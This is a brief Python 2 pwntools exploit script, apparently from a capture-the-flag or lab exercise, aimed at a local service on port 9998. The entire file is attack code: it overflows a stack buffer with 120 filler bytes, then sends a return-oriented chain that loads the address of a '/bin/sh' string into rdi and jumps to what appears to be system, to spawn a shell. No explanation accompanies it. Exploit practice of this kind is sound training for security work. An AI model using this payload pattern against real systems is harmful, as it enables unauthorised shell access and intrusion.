from pwn import *

def attacker(host="127.0.0.1", port=9998):
    io = remote(host, port)
    binsh = 0x400644
    poprdi_ret = 0x400623
    payload = "&"*112
    payload += "B"*8
    payload += p64(poprdi_ret)
    payload += p64(binsh)
    payload += p64(0x400450)

    io.send(payload)
    return True

if __name__ == "__main__":
    print attacker()
